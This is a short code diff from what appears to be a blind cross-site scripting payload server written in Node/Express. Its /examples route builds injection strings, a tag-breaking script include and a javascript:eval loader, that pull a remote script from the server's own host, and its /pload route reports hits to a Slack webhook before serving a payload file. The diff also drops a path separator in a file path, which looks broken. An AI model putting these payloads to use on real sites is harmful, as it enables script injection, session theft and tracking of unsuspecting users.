@@ -98,7 +98,9 @@ app.get("/examples", (req, res) => {
   //var url = "https://globalcu.org";
   //var url = req.protocol + '://' + req.headers['host']
   var url = "https://" + req.headers["host"];
-  var page = "";
+  //var url = `http://globalcu.org${req.headers["host"]}`;
+  var page = "/*"; // This represents a wildcard path
+  //var page = "";
   page += `\'"><script src="${url}"></script>\n\n`;
   page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;
 
@@ -214,7 +216,7 @@ app.all("/pload", (req, res) => {
   };
 
   request.post(slack_incoming_webhook, data, (out) => {
-    res.sendFile(path.join(__dirname + "/pload.js"));
+    res.sendFile(path.join(__dirname + "pload.js"));
   });
 });
 
